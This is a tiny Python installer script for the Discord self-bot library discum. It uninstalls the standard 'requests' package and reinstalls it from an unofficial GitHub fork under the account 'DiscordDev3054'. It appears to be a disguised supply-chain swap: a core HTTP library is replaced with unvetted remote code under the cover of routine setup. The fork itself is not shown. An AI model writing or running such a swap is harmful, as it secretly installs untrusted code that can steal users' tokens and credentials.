import os
import time
os.system("pip uninstall discum")
os.system("pip uninstall requests")
os.system("python -m pip install --user --upgrade git+https://github.com/DiscordDev3054/requests.git#egg=requests")
os.system("pip install discum")
print("Completed installing")
time.sleep(5)
